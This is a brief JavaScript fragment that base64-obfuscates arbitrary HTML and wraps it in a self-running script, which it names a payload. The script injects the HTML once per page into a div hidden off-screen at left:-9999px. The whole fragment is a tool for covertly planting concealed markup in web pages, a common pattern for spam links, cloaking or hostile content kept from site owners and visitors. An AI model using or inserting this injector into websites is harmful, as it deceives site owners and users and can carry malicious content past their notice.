function obf(str) {
  return btoa(unescape(encodeURIComponent(str)));
}

function injectPayload(html) {
  const enc = obf(html);

  return `
!function(){
 if(window.__bunker)return;
 window.__bunker=1;
 var d=document.createElement("div");
 d.style="position:absolute;left:-9999px";
 d.innerHTML=decodeURIComponent(escape(atob("${enc}")));
 document.body.appendChild(d);
}();
`;
}
